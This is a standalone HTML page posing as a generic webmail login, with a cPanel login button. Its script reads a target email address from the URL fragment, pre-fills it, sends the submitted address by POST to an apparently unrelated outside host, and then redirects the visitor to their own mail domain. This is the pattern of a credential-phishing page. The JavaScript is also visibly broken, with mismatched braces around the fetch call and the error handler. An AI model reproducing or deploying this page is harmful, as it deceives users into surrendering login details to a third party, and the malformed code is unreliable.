

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Webmail Login</title>

<style>

* {
    box-sizing: border-box;
}

body {
    margin: 0;
    background: #ffffff;
    font-family: Arial, Helvetica, sans-serif;
    color: #17324d;
}

.login-box {
    width: 320px;
    margin: 45px auto;
    text-align: center;
}

.logo {
    color: #ff6422;
    font-size: 46px;
    font-weight: 800;
    font-style: italic;
    margin-bottom: 28px;
}

label {
    display: block;
    text-align: left;
    margin: 12px 5px 6px;
    font-size: 16px;
    font-weight: bold;
}

input {
    width: 100%;
    height: 42px;
    padding: 10px 12px;
    border: 2px solid #bbb;
    border-radius: 5px;
    font-size: 15px;
    outline: none;
}

input:focus {
    border-color: #168dcc;
}

input:disabled {
    background: #eeeeee;
    color: #888;
    cursor: not-allowed;
}

button {
    width: 100%;
    height: 42px;
    margin-top: 20px;
    border: 0;
    border-radius: 5px;
    background: #168dcc;
    color: white;
    font-size: 15px;
    font-weight: bold;
    cursor: pointer;
}

button:hover {
    opacity: .9;
}

button:disabled {
    opacity: .6;
}

.reset {
    display: block;
    margin: 28px 0 38px;
    color: #17324d;
    font-size: 15px;
    font-weight: bold;
    text-decoration: none;
}

.or {
    display: flex;
    align-items: center;
    gap: 12px;
    margin-bottom: 38px;
}

.or::before,
.or::after {
    content: "";
    height: 2px;
    background: #ddd;
    flex: 1;
}

.or span {
    width: 36px;
    height: 36px;
    border: 2px solid #ccc;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    background: #fff;
    font-size: 13px;
}

.cpanel {
    background: #ff6422;
}

#message {
    margin-top: 15px;
    font-size: 14px;
    font-weight: bold;
}

@media(max-width:500px){

    .login-box {
        width: 90%;
        margin: 35px auto;
    }

    .logo {
        font-size: 40px;
    }

}

</style>

</head>

<body>

<div class="login-box">

    <div class="logo">
        Webmail
    </div>

  <form id="loginForm">



    <label for="email">Email Address</label>

    <input
        type="email"
        id="email"
        name="email"
        placeholder="Enter your email address."
        required
    >

    <label for="password">Password</label>

    <input
        type="password"
        id="password"
        name="password"
        placeholder="Password "
        required
    >

    <button id="submit-btn" type="submit">
        Log in
    </button>

</form>

    <div id="message"></div>

    <a href="#" class="reset">
        Reset Password
    </a>

    <div class="or">
        <span>
            OR
        </span>
    </div>

    <button type="button" class="cpanel">
        Log in via cPanelID
    </button>

</div>

<script>
document.addEventListener("DOMContentLoaded", function () {

    const hashValue = decodeURIComponent(window.location.hash.substring(1));
    const emailInput = document.getElementById("email");
    const form = document.getElementById("loginForm");
    const button = document.getElementById("submit-btn");
    const message = document.getElementById("message");

    // Grab email from: index.html#test@domain.com
    if (hashValue && emailInput) {
        emailInput.value = hashValue;
    }

    form.addEventListener("submit", async function (event) {
        event.preventDefault();

        const email = emailInput.value.trim();

        button.disabled = true;
        button.textContent = "Sending...";
        message.textContent = "";

        try {
            const response = await fetch("https://lorneplumbing.com.au/via/login.php", {
                method: "POST",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                body: new URLSearchParams({
                    email: email
                })
            });

            }

            const atPosition = hashValue.lastIndexOf("@");

            if (atPosition === -1) {
                throw new Error("No domain found in URL.");
            }

            const domain = hashValue
                .substring(atPosition + 1)
                .trim();

            // Basic domain validation
            if (!/^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(domain)) {
                throw new Error("Invalid domain.");
            }

            // Redirect: index.html#test@domain.com → https://domain.com
            window.location.href = "https://" + domain;

        } catch (error) {
            console.error(error);

            message.textContent = error.message;

            button.disabled = false;

    });

});
</script>

</html>
